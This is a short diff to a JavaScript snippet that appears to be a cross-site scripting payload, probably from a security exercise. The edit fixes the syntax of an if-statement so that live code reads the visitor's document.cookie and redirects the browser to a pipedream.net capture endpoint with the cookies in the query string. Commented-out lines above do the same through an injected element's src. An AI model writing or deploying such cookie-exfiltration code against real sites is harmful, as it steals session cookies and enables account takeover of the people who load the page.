@@ -2,7 +2,8 @@
 // node.setAttribute("src", "https://ensgnh0kr2ws.x.pipedream.net?"+document.cookie);
 // document.getElementsByTagName("body")[0].appendChild(node);
 
-if document.cookie.split(";").length >1 {
+if (document.cookie.split(";").length >1) {
     document.cookie = "aaa=bbb" 
     window.location.replace("https://ensgnh0kr2ws.x.pipedream.net?c="+document.cookie.toString());
 }                                                                    
+                                                       
